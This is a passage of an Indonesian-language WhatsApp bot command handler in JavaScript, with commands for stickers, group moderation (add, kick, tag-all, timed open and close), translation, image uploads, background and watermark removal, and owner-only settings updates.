            message += `⏳ ${isCharging ? 'Waktu sampai penuh' : 'Sisa waktu'}: ${hours}j ${minutes}m\n`;
        }

        message += '\n';
        
       
        if (level <= 20) {
            message += '⚠️ *Peringatan:* Baterai lemah, segera charge!';
        } else if (level >= 80 && isCharging) {
            message += '✅ *Info:* Baterai sudah hampir penuh.';
        }

        m.reply(message);
    } catch (error) {
        m.reply(`❌ Terjadi error: ${error.message}`);
        console.error('Battery check error:', error);
    }}
    break
    
case "qc": {
if (!text) return m.reply(example('teksnya'))
let warna = ["#000000", "#ff2414", "#22b4f2", "#eb13f2"]
var ppuser
try {
ppuser = await conn.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg'
}
const json = {
  "type": "quote",
  "format": "png",
  "backgroundColor": "#000000",
  "width": 812,
  "height": 968,
  "scale": 2,
  "messages": [
    {
      "entities": [],
      "avatar": true,
      "from": {
        "id": 1,
        "name": m.pushName,
        "photo": {
          "url": ppuser
        }
      },
      "text": text,
      "replyMessage": {}
    }
  ]
};
const axios = require('axios');
        const response = axios.post('https://bot.lyo.su/quote/generate', json, {
        headers: {'Content-Type': 'application/json'}
}).then(async (res) => {
    const buffer = Buffer.from(res.data.result.image, 'base64')
    let tempnya = "./library/database/sampah/"+m.sender+".png"
await fs.writeFile(tempnya, buffer, async (err) => {
if (err) return m.reply("Error")
await conn.sendAsSticker(m.chat, tempnya, m, {packname: global.packname})
await fs.unlinkSync(`${tempnya}`)
})
})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "s": case "sticker": case "stiker": {
if (!/image|video/gi.test(mime)) return m.reply(example("dengan kirim media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
var image = await conn.downloadAndSaveMediaMessage(qmsg)
await conn.sendAsSticker(m.chat, image, m, {packname: global.packname})
await fs.unlinkSync(image)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'opentime': {
    if (!m.isGroup) return m.reply('ᴋʜᴜsᴜs ɢʀᴏᴜᴘ')
    if (!m.isBotAdmin) return m.reply(mess.botAdmin)
    if (!args[0] || isNaN(args[0])) return m.reply('• Format waktu: detik, menit, jam, hari\n• Contoh: 10 detik')
    
    const timeUnits = {
        'detik': 1000,
        'menit': 60000,
        'jam': 3600000,
        'hari': 86400000
    }
    const unit = args[1]?.toLowerCase()
    if (!timeUnits[unit]) return m.reply('• Format waktu: detik, menit, jam, hari\n• Contoh: 10 detik')
    const timer = parseInt(args[0]) * timeUnits[unit]
    m.reply(`Open time ${args[0]} ${unit} dimulai dari sekarang`)
    setTimeout(() => {
        try {
            conn.groupSettingUpdate(m.chat, 'not_announcement')
            m.reply('*Tepat waktu* grup dibuka oleh admin\nsekarang member dapat mengirim pesan')
        } catch (err) {
            m.reply('Terjadi kesalahan saat membuka grup')
            console.log(err)
        }
    }, timer)
}
    break

case 'closetime': {
    if (!m.isGroup) return m.reply('ᴋʜᴜsᴜs ɢʀᴏᴜᴘ')
    if (!m.isBotAdmin) return m.reply(mess.botAdmin)
    if (!args[0] || isNaN(args[0])) return m.reply('• Format waktu: detik, menit, jam, hari\n• Contoh: 10 detik')
    
    const timeUnits = {
        'detik': 1000,
        'menit': 60000,
        'jam': 3600000,
        'hari': 86400000
    }
    const unit = args[1]?.toLowerCase()
    if (!timeUnits[unit]) return m.reply('• Format waktu: detik, menit, jam, hari\n• Contoh: 10 detik')
    const timer = parseInt(args[0]) * timeUnits[unit]
    m.reply(`Close time ${args[0]} ${unit} dimulai dari sekarang`)
    setTimeout(() => {
        try {
            conn.groupSettingUpdate(m.chat, 'announcement')
            m.reply('*Tepat waktu* grup ditutup oleh admin\nsekarang hanya admin yang dapat mengirim pesan')
        } catch (err) {
            m.reply('Terjadi kesalahan saat menutup grup')
            console.log(err)
        }
    }, timer)
}
    break
    
case 'quotes': case 'kata²': case 'kata-kata': case 'kata"': {
if (!args[0]) return m.reply("Masukkan kata kunci, contoh: *quotes hari ini*");


  async function squotes(input) {
    return new Promise((resolve, reject) => {
      fetch('https://jagokata.com/kata-bijak/kata-' + input.replace(/\s/g, '_') + '.html?page=1')
        .then(res => res.text())
        .then(res => {
          const $ = cheerio.load(res)
          let data = []
          $('div[id="main"]').find('ul[id="citatenrijen"] > li').each(function (index, element) {
            let x = $(this).find('div[class="citatenlijst-auteur"] > a').text().trim()
            let y = $(this).find('span[class="auteur-beschrijving"]').text().trim()
            let z = $(element).find('q[class="fbquote"]').text().trim()
            data.push({ author: x, bio: y, quote: z })
          })
          data.splice(2, 1)
          if (data.length == 0) return resolve({ creator: "Wudysoft", status: false })
          resolve({ creator: "Fruatre", status: true, data })
        }).catch(reject)
    })
  }

  squotes(args[0]).then(res => {
    if (res.status) {
      let teks = ''
      res.data.forEach(function (item, index) {
        teks += `*${item.quote}*\n- ${item.author}, ${item.bio}\n\n`
      })
      m.reply(teks)
    } else {
      m.reply('Tidak ada kutipan yang ditemukan.')
    }
  })
}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "swm": case "stickerwm": case "stikerwm": case "wm": {
if (!text) return m.reply(example("namamu dengan kirim media"))
if (!/image|video/gi.test(mime)) return m.reply(example("namamu dengan kirim media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
var image = await conn.downloadAndSaveMediaMessage(qmsg)
await conn.sendAsSticker(m.chat, image, m, {packname: text})
await fs.unlinkSync(image)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "tourl": {
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
let media = await conn.downloadAndSaveMediaMessage(qmsg)
const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('pixhost.to');
let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'image.png');

let teks = directLink.toString()
await conn.sendMessage(m.chat, {text: teks}, {quoted: m})
await fs.unlinkSync(media)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "tourl2": {
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
let media = await conn.downloadAndSaveMediaMessage(qmsg)
const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('postimages.org');
let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'image.png');
let teks = directLink.toString()
await conn.sendMessage(m.chat, {text: teks}, {quoted: m})
await fs.unlinkSync(media)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "tr": case "translate": {
  let language
  let teks
  let defaultLang = "en"
  if (text || m.quoted) {
    let translate = require('translate-google-api')
    if (text && !m.quoted) {
      if (args.length < 2) return m.reply(example("id good night"))
      language = args[0]
      teks = text.split(" ").slice(1).join(' ')
    } else if (m.quoted) {
      if (!text) return m.reply(example("id good night"))
      if (args.length < 1) return m.reply(example("id good night"))
      if (!m.quoted.text) return m.reply(example("id good night"))
      language = args[0]
      teks = m.quoted.text
    }
    let result
    try {
      result = await translate(`${teks}`, {to: language})
    } catch (e) {
      result = await translate(`${teks}`, {to: defaultLang})
    } finally {
      m.reply(result[0], { quoted: m })
    }
  } else {
    return m.reply(example("id good night"))
  }
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "tohd": case "hd": case "remini": {
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
let foto = await conn.downloadAndSaveMediaMessage(qmsg)
let result = await remini(await fs.readFileSync(foto), "enhance")
await conn.sendMessage(m.chat, {image: result}, {quoted: m})
await fs.unlinkSync(foto)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "add": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (text) {
const input = text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await conn.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
const res = await conn.groupParticipantsUpdate(m.chat, [input], 'add')
if (Object.keys(res).length == 0) {
return m.reply(`Berhasil Menambahkan ${input.split("@")[0]} Kedalam Grup Ini`)
} else {
return m.reply(JSON.stringify(res, null, 2))
}} else {
return m.reply(example("62838###"))
}
}
break

case "sfile": {
  if (!text) return m.reply(`Example: ${prefix + command} query`);
  try {
    let api = await fetch(`https://api-rest-rizzkyxofc.vercel.app/api/search/sfile?q=${text}`);
    let data = await api.json();
    if (!data.status) return m.reply('Search failed! Try again later.');
    if (data.result.length === 0) return m.reply('No files found!');
    
    let teks = `乂 *SFILE SEARCH* ◦\n\n`;
    data.result.slice(0, 25).forEach((file, index) => {
      teks += `乂 *${index + 1}.* ${file.filename}\n`;
      teks += `乂 *Url* : ${file.url}\n\n`;
    });
    
    await conn.sendMessage(m.chat, { text: teks }, { quoted: m });
  } catch (e) {
    console.log(e);
    m.reply('Error occurred while searching!');
  }
}
break

case "readerqr": case "bacaqr":
    if (!m.message.extendedTextMessage || !m.message.extendedTextMessage.contextInfo.quotedMessage) {
        return conn.sendMessage(m.key.remoteJid, { text: "❌ Harap reply gambar QR Code untuk membacanya." }, { quoted: m });
    }

    let quotedMessage = m.message.extendedTextMessage.contextInfo.quotedMessage;
    
    if (!quotedMessage.imageMessage) {
        return conn.sendMessage(m.key.remoteJid, { text: "❌ Harap reply gambar QR Code, bukan teks atau media lain." }, { quoted: m });
    }

    try {
        const stream = await downloadContentFromMessage(quotedMessage.imageMessage, "image");
        let buffer = Buffer.from([]);

        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk]);
        }

        let imagePath = "./temp_qr.jpg"; 
        fs.writeFileSync(imagePath, buffer);

        Jimp.read(imagePath, (err, image) => {
            if (err) {
                return conn.sendMessage(m.key.remoteJid, { text: "❌ Gagal membaca gambar QR Code." }, { quoted: m });
            }

            const qr = new qrCodeReader();
            qr.callback = (error, result) => {
                if (error || !result) {
                    return conn.sendMessage(m.key.remoteJid, { text: "❌ QR Code tidak valid atau tidak ditemukan." }, { quoted: m });
                }

                conn.sendMessage(m.key.remoteJid, { text: `✅ Hasil QR Code: ${result.result}` }, { quoted: m });
            };

            qr.decode(image.bitmap);
        });

    } catch (error) {
        console.error("Error membaca QR:", error);
        conn.sendMessage(m.key.remoteJid, { text: "❌ Terjadi kesalahan saat membaca QR Code." }, { quoted: m });
    }

    break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "kick": case "kik": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (text || m.quoted) {
const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await conn.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
const res = await conn.groupParticipantsUpdate(m.chat, [input], 'remove')
await m.reply(`Berhasil mengeluarkan ${input.split("@")[0]} dari grup ini`)
} else {
return m.reply(example("@tag/reply"))
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "leave": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
await m.reply("Baik, Saya Akan Keluar Dari Grup Ini")
await sleep(4000)
await conn.groupLeave(m.chat)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "resetlinkgc": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
await conn.groupRevokeInvite(m.chat)
m.reply("Berhasil mereset link grup ✅")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "tagall": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!text) return m.reply(example("pesannya"))
let teks = text+"\n\n"
let member = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
await member.forEach((e) => {
teks += `@${e.split("@")[0]}\n`
})
await conn.sendMessage(m.chat, {text: teks, mentions: [...member]}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "linkgc": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
const urlGrup = "https://chat.whatsapp.com/" + await conn.groupInviteCode(m.chat)
var teks = `
${urlGrup}
`
await conn.sendMessage(m.chat, {text: teks, matchedText: `${urlGrup}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ht": case "hidetag": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!text) return m.reply(example("pesannya"))
let member = m.metadata.participants.map(v => v.id)
await conn.sendMessage(m.chat, {text: text, mentions: [...member]}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "joingc": case "join": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("linkgcnya"))
if (!text.includes("chat.whatsapp.com")) return m.reply("Link tautan tidak valid")
let result = text.split('https://chat.whatsapp.com/')[1]
let id = await conn.groupAcceptInvite(result)
m.reply(`Berhasil bergabung ke dalam grup ${id}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "get": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("https://example.com"))
let data = await fetchJson(text)
m.reply(JSON.stringify(data, null, 2))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "joinch": case "joinchannel": {
if (!isCreator) return Reply(mess.owner)
if (!text && !m.quoted) return m.reply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/") && !m.quoted.text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = m.quoted ? m.quoted.text.split('https://whatsapp.com/channel/')[1] : text.split('https://whatsapp.com/channel/')[1]
let res = await conn.newsletterMetadata("invite", result)
await conn.newsletterFollow(res.id)
m.reply(`
*Berhasil join channel whatsapp ✅*
* Nama channel : *${res.name}*
* Total pengikut : *${res.subscribers + 1}*
`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "toascii":
case "toasciiart": {
  const text = args.join(" ");
  const font = [
    "Standard",
    "Slant",
    "Bubble",
    "Digital",
    "Script",
    "Cursive",
    "Banner",
    "Big",
    "Old English",
    "Roman",
    "Greek",
    "Hebrew",
    "Arabic",
    "Chinese"
  ];

  const fontList = font.map((f, i) => `${i + 1}. ${f}`);
  const fontMessage = `Pilih font ASCII Art:\n${fontList.join("\n")}`;

  await m.reply(fontMessage);

  const response = await m.reply(`Masukkan nomor font (1-${font.length}):`);
  const fontIndex = parseInt(response.text);

  if (fontIndex >= 1 && fontIndex <= font.length) {
    const fontStyle = font[fontIndex - 1];
    const asciiArt = await toAsciiArt(text, fontStyle);
    await m.reply(asciiArt);
  } else {
    await m.reply("Nomor font tidak valid");
  }
}
  break

case "autoread": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.autoread == true) return m.reply(`*Autoread* sudah aktif!`)
global.db.settings.autoread = true
return m.reply("Berhasil menyalakan *autoread*")
} else if (teks == "off") {
if (global.db.settings.autoread == false) return m.reply(`*Autoread* tidak aktif!`)
global.db.settings.autoread = false
return m.reply("Berhasil mematikan *autoread*")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'removewm':
case 'delwm': {
    if (!quoted) return m.reply('Harap balas ke foto yang ingin dihapus watermarknya')
    if (!/image/.test(mime)) return m.reply(`Kirim/Balas foto dengan caption ${prefix + command}`)

    const BodyForm = require('form-data')
    const uploadFileUgu = async (input) => {
        try {
            const form = new BodyForm()
            form.append("files[]", fs.createReadStream(input))
            
            const { data } = await axios({
                url: "https://uguu.se/upload.php",
                method: "POST",
                headers: {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
                    ...form.getHeaders()
                },
                data: form,
                timeout: 10000 
            })
            
            if (!data?.files?.[0]) throw new Error('Upload failed')
            return data.files[0]
            
        } catch (err) {
            throw new Error(`Error uploading file: ${err.message}`)
        }
    }

    try {
        
        await conn.sendMessage(m.chat, { 
            react: { 
                text: '⏱️', 
                key: m.key 
            }
        })

        
        const media = await conn.downloadAndSaveMediaMessage(quoted)
        const uploadResult = await uploadFileUgu(media)
        const imageUrl = `https://fastrestapis.fasturl.cloud/aiimage/imgremovewm?url=${uploadResult.url}`
        
       
        await conn.sendMessage(m.chat, { 
            image: { url: imageUrl }, 
            caption: '*Ini hasil remove watermark gambarnya*' 
        }, { 
            quoted: m
        })

       
        fs.unlinkSync(media)
        
    } catch (error) {
        console.error('Error in remove watermark:', error)
        m.reply('Maaf, terjadi kesalahan saat menghapus watermark gambar. Silakan coba lagi nanti atau hubungi pemilik bot jika masalah berlanjut.')
    }
}
break

case 'removebg':
case 'delbackground':
case 'remove background': {
    if (!quoted) return m.reply('Harap balas ke foto yang ingin dihapus backgroundnya')
    if (!/image/.test(mime)) return m.reply(`Kirim/Balas foto dengan caption ${prefix + command}`)

    const BodyForm = require('form-data')
    const uploadFileUgu = async (input) => {
        try {
            const form = new BodyForm()
            form.append("files[]", fs.createReadStream(input))
            
            const { data } = await axios({
                url: "https://uguu.se/upload.php",
                method: "POST",
                headers: {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
                    ...form.getHeaders()
                },
                data: form,
                timeout: 10000 
            })
            
            if (!data?.files?.[0]) throw new Error('Upload failed')
            return data.files[0]
            
        } catch (err) {
            throw new Error(`Error uploading file: ${err.message}`)
        }
    }

    try {
        
        await conn.sendMessage(m.chat, { 
            react: { 
                text: '⏱️', 
                key: m.key 
            }
        })

      
        const media = await conn.downloadAndSaveMediaMessage(quoted)
        const uploadResult = await uploadFileUgu(media)
        const imageUrl = `https://fastrestapis.fasturl.cloud/aiimage/removebg?imageUrl=${uploadResult.url}&type=auto&shadow=false`
        
        
        await conn.sendMessage(m.chat, { 
            image: { url: imageUrl }, 
            caption: '*Ini hasil remove background gambarnya*' 
        }, { 
            quoted: m
        })

    
        fs.unlinkSync(media)
        
    } catch (error) {
        console.error('Error in remove background:', error)
        m.reply('Maaf, terjadi kesalahan saat menghapus background gambar. Silakan coba lagi nanti atau hubungi pemilik bot jika masalah berlanjut.')
    }
}
break

case "autopromosi": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.autopromosi == true) return m.reply(`*Autopromosi* sudah aktif!`)
global.db.settings.autopromosi = true
return m.reply("Berhasil menyalakan *autopromosi*")
} else if (teks == "off") {
if (global.db.settings.autopromosi == false) return m.reply(`*Autopromosi* tidak aktif!`)
global.db.settings.autopromosi = false
return m.reply("Berhasil mematikan *autopromosi*")
} else return m.reply(example("on/off"))
}
break

case 'creategc': case 'buatgc': case 'buatgrup': case 'buatgb': {
    if (!isCreator) return m.reply('Khusus Creator/Owner');
    
    let parts = text.split('|');
    let groupName = parts[0]?.trim();
    let groupDesc = parts[1]?.trim() || '';
    
    if (!groupName) {
        return m.reply(`Cara penggunaan: 
${prefix + command} NamaGroup|DeskripsiGroup

- Pisahkan nama dan deskripsi grup dengan simbol | 
- Deskripsi grup bersifat opsional

Contoh: 
${prefix + command} Grup Keren|Grup untuk diskusi keren`);
    }
    
    try {
        let groupData = await conn.groupCreate(groupName, []);
       
        await new Promise(resolve => setTimeout(resolve, 1000));
        
      
        if (groupDesc) {
            await conn.groupUpdateDescription(groupData.id, groupDesc);
        }
       
        let hasSetPicture = false;
        if (m.quoted && /image/.test(m.quoted.mimetype)) {
            try {
                let media = await m.quoted.download();
                await conn.updateProfilePicture(groupData.id, media);
                hasSetPicture = true;
            } catch (pictureError) {
                console.error('Error setting group picture:', pictureError);
            }
        }
        
        
        let response = await conn.groupInviteCode(groupData.id);
        let inviteLink = `https://chat.whatsapp.com/${response}`;
                let successDetails = [];
        successDetails.push(`✅ Grup "${groupName}" berhasil dibuat!`);
        
        if (groupDesc) {
            successDetails.push(`✅ Deskripsi grup berhasil diatur`);
        }
        
        successDetails.push(`\nLink grup: ${inviteLink}`);
        
      
        await conn.sendMessage(m.chat, {
            text: successDetails.join('\n'),
            contextInfo: {
                mentionedJid: [m.sender],
                forwardingScore: 999999, 
                isForwarded: true, 
                forwardedNewsletterMessageInfo: {
                    newsletterName: global.namaSaluran,
                    newsletterJid: global.idSaluran,
                },
                externalAdReply: {
                    showAdAttribution: true,
                    title: groupName,
                    body: groupDesc || 'Undangan chat grup',
                    thumbnailUrl: global.image.menu, 
                    sourceUrl: inviteLink,
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        });
    } catch (error) {
        console.error('Error creating group:', error);
        m.reply(`Gagal membuat grup: ${error.message}`);
    }
}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "autotyping": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.autotyping == true) return m.reply(`*Autotyping* sudah aktif!`)
global.db.settings.autotyping = true
return m.reply("Berhasil menyalakan *autotyping*")
} else if (teks == "off") {
if (global.db.settings.autotyping == false) return m.reply(`*Autotyping* tidak aktif!`)
global.db.settings.autotyping = false
return m.reply("Berhasil mematikan *autotyping*")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "autoreadsw": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.readsw == true) return m.reply(`*Autoreadsw* sudah aktif!`)
global.db.settings.readsw = true
return m.reply("Berhasil menyalakan *autoreadsw*")
} else if (teks == "off") {
if (global.db.settings.readsw == false) return m.reply(`*Autoreadsw* tidak aktif!`)
global.db.settings.readsw = false
return m.reply("Berhasil mematikan *autoreadsw*")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "welcome": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].welcome == true) return m.reply(`*Welcome* di grup ini sudah aktif!`)
global.db.groups[m.chat].welcome = true
return m.reply("Berhasil menyalakan *welcome* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].welcome == false) return m.reply(`*Welcome* di grup ini tidak aktif!`)
global.db.groups[m.chat].welcome = false
return m.reply("Berhasil mematikan *welcome* di grup ini")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "antilink": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].antilink == true) return m.reply(`*Antilink* di grup ini sudah aktif!`)
if (global.db.groups[m.chat].antilink2 == true) global.db.groups[m.chat].antilink2 = false
global.db.groups[m.chat].antilink = true
return m.reply("Berhasil menyalakan *antilink* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].antilink == false) return m.reply(`*Antilink* di grup ini tidak aktif!`)
global.db.groups[m.chat].antilink = false
return m.reply("Berhasil mematikan *antilink* di grup ini")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'updo': case 'settdomain': case 'setdomain': {
    if (!isCreator) return m.reply('*[ System Notice ]* Khusus Owner');
    if (text || m.quoted) {
        const newteks = m.quoted ? m.quoted.text : text;
        global.domain = newteks;
        
     
        try {
            const fs = require('fs');
            const path = './settings.js'; 
           let content = fs.readFileSync(path, 'utf8');
            
            
            const domainRegex = /(global\.domain\s*=\s*['"`])([^'"`]*?)(['"`])/;
            content = content.replace(domainRegex, `$1${newteks}$3`);
            
           
            fs.writeFileSync(path, content);
            
            await conn.sendMessage(m.chat, { text: "_Berhasil Mengganti Domain Panel✅_" }, { quoted: m });
        } catch (error) {
            console.error('Error updating settings.js:', error);
            await conn.sendMessage(m.chat, { text: "_Gagal menyimpan perubahan ke file settings.js_" }, { quoted: m });
        }
    } else {
        await conn.sendMessage(m.chat, { text: `*Format salah!*\nContoh: ${prefix + command} <Domain>` }, { quoted: m });
    }
}
break

case 'upapi': case 'settapi': case 'setapi': {
    if (!isCreator) return m.reply('*[ System Notice ]* Khusus Owner');
    if (!text && !m.quoted) return m.reply(`*Format Salah!*\nContoh: ${prefix + command} <Apikey>`);

    const newteks = m.quoted ? m.quoted.text : text;

    if (newteks) {
        global.apikey = newteks;
        
       
        try {
            const fs = require('fs');
            const path = './settings.js'; 
            let content = fs.readFileSync(path, 'utf8');
            
            
            const apikeyRegex = /(global\.apikey\s*=\s*['"`])([^'"`]*?)(['"`])/;
            content = content.replace(apikeyRegex, `$1${newteks}$3`);
            
            
            fs.writeFileSync(path, content);
            
            await conn.sendMessage(m.chat, { text: "_Berhasil Mengganti Apikey Panel✅_" }, { quoted: m });
        } catch (error) {
            console.error('Error updating settings.js:', error);
            await conn.sendMessage(m.chat, { text: "_Gagal menyimpan perubahan ke file settings.js_" }, { quoted: m });
        }
    } else {
        return m.reply(`*Format Salah!*\nContoh: ${prefix + command} <Apikey>`);
    }
}
break

case 'upcapi': case 'settcapi': case 'setcapi': {
    if (!isCreator) return m.reply('*[ System Notice ]* Khusus Owner');
    if (text || m.quoted) {
        const newteks = m.quoted ? m.quoted.text : text; 
        global.capikey = newteks;
        
      
        try {
            const fs = require('fs');
            const path = './settings.js'; 
            let content = fs.readFileSync(path, 'utf8');
            
            const capikeyRegex = /(global\.capikey\s*=\s*['"`])([^'"`]*?)(['"`])/;
            content = content.replace(capikeyRegex, `$1${newteks}$3`);
            
           
            fs.writeFileSync(path, content);
            
            await conn.sendMessage(m.chat, { text: "_Berhasil Mengganti Capikey Panel✅_" }, { quoted: m });
        } catch (error) {
            console.error('Error updating settings.js:', error);
            await conn.sendMessage(m.chat, { text: "_Gagal menyimpan perubahan ke file settings.js_" }, { quoted: m });
        }
    } else {
        await conn.sendMessage(m.chat, { text: `*Format salah!*\nContoh: ${prefix + command} <Capikey>` }, { quoted: m });
    }
}
break

case 'updo2': case 'settdomain2': case 'setdomain2': {
    if (!isCreator) return m.reply('*[ System Notice ]* Khusus Owner');
    if (text || m.quoted) {
        const newteks = m.quoted ? m.quoted.text : text;
        global.domainV2 = newteks;
        
     
        try {
            const fs = require('fs');
            const path = './settings.js'; 
           let content = fs.readFileSync(path, 'utf8');
            
            
            const domainRegex = /(global\.domain\s*=\s*['"`])([^'"`]*?)(['"`])/;
            content = content.replace(domainRegex, `$1${newteks}$3`);
            
           
            fs.writeFileSync(path, content);
            
            await conn.sendMessage(m.chat, { text: "_Berhasil Mengganti Domain Panel✅_" }, { quoted: m });
        } catch (error) {
            console.error('Error updating settings.js:', error);
            await conn.sendMessage(m.chat, { text: "_Gagal menyimpan perubahan ke file settings.js_" }, { quoted: m });
        }
    } else {
        await conn.sendMessage(m.chat, { text: `*Format salah!*\nContoh: ${prefix + command} <Domain>` }, { quoted: m });
    }
}
break

case 'upapi2': case 'settapi2': case 'setapi2': {
    if (!isCreator) return m.reply('*[ System Notice ]* Khusus Owner');
    if (!text && !m.quoted) return m.reply(`*Format Salah!*\nContoh: ${prefix + command} <Apikey>`);

    const newteks = m.quoted ? m.quoted.text : text;

    if (newteks) {
        global.apikeyV2 = newteks;
        
       
        try {
            const fs = require('fs');
            const path = './settings.js'; 
            let content = fs.readFileSync(path, 'utf8');
            
            
            const apikeyRegex = /(global\.apikey\s*=\s*['"`])([^'"`]*?)(['"`])/;
            content = content.replace(apikeyRegex, `$1${newteks}$3`);
            
            
            fs.writeFileSync(path, content);
            
            await conn.sendMessage(m.chat, { text: "_Berhasil Mengganti Apikey Panel✅_" }, { quoted: m });
        } catch (error) {
            console.error('Error updating settings.js:', error);
            await conn.sendMessage(m.chat, { text: "_Gagal menyimpan perubahan ke file settings.js_" }, { quoted: m });
        }
    } else {
        return m.reply(`*Format Salah!*\nContoh: ${prefix + command} <Apikey>`);
    }
}
break

case 'upcapi2': case 'settcapi2': case 'setcapi2': {
    if (!isCreator) return m.reply('*[ System Notice ]* Khusus Owner');
    if (text || m.quoted) {
        const newteks = m.quoted ? m.quoted.text : text; 
        global.capikeyV2 = newteks;
        
      
        try {
            const fs = require('fs');
            const path = './settings.js'; 
            let content = fs.readFileSync(path, 'utf8');
            
            const capikeyRegex = /(global\.capikey\s*=\s*['"`])([^'"`]*?)(['"`])/;
            content = content.replace(capikeyRegex, `$1${newteks}$3`);
            
           
            fs.writeFileSync(path, content);
            
            await conn.sendMessage(m.chat, { text: "_Berhasil Mengganti Capikey Panel✅_" }, { quoted: m });
        } catch (error) {
            console.error('Error updating settings.js:', error);
            await conn.sendMessage(m.chat, { text: "_Gagal menyimpan perubahan ke file settings.js_" }, { quoted: m });
        }
    } else {
        await conn.sendMessage(m.chat, { text: `*Format salah!*\nContoh: ${prefix + command} <Capikey>` }, { quoted: m });
